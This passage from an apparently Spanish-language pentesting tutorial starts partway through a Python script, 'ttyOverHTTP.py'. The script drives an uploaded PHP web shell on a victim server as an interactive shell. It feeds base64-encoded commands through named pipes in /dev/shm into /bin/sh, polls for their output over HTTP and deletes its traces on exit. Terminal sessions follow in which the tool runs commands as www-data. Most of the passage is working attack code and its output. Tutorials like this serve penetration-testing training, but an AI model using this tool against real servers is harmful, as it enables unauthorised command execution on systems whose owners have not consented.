		&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;readoutput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;clearoutput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;echo '' &amp;gt; %s&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readoutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clearoutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        	&lt;span class=&quot;s&quot;&gt;'cmd'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'echo &quot;%s&quot; | base64 -d | sh'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://127.0.0.1/cmd.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;WriteCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;s&quot;&gt;'cmd'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'echo &quot;%s&quot; | base64 -d &amp;gt; %s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://127.0.0.1/cmd.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ReadCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GetOutput&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SetupShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;NamedPipes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;mkfifo %s; tail -f %s | /bin/sh 2&amp;gt;&amp;amp;1 &amp;gt; %s&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NamedPipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/dev/shm/input.%s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/dev/shm/output.%s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;erasestdin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;erasestdout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;SetupShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ReadingTheThings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AllTheReads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sig_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Exiting...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] Removing files...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;erasestdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;RunCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;erasestdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*] All files have been deleted&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;WriteCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Importante&lt;/strong&gt;: En este caso estamos tirando contra la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; suponiendo que el fichero se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.php&lt;/code&gt;, en vuestro caso lo tendréis que cambiar a lo que os toque.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entonces bien, imaginad que ya tenéis un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.php&lt;/code&gt; alojado en el servidor víctima, pues mirad que sencillo:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttyOverHTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1156&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya directamente se gestiona desde el script la sesión, pudiendo así ver los outputs de los comandos que especifiquemos desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El procedimiento ahora para obtener una TTY y proseguir naturalmente sería el mismo que os mostré anteriormente:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttyOverHTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;                  
&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
